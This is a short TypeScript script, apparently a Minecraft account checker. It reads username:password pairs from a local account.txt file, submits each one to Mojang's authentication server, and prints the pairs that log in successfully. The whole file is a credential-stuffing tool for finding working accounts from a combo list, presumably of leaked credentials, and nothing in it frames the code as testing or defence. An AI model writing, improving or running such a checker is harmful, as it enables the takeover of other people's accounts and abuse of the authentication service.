import request from './request';
import {readFileSync} from 'fs'

async function readAcoount(path:string):Promise<Array<string>>{
    const data = await readFileSync(path,{encoding:'utf-8'});
    const accounts = data.split('\r\n');
    return accounts;
}


const url = 'https://authserver.mojang.com/authenticate'
const method = 'POST'
const header = {}

function geneContent(username:string, password:string) {
    var obj = {
        agent: {
            name: 'Minecraft',
            version:1,
        },
        username: username,
        password: password,
        clientToken: "client identifier",    
        requestUser: true             
    }
    return JSON.stringify(obj);
}


async function main() {
    var accounts = await readAcoount('./account.txt');
    var len = accounts.length ;
    for (let i = 0; i < len; i++){
        let target = accounts[i];
        let username = target.split(':')[0];
        let password=target.split(':')[1];
        let content = geneContent(username, password);
        request(url, method, header, content, true).then((data) => {
            if (!data.hasOwnProperty('error')) {
                console.log(target);
            }
        });
        
    }
}
main();

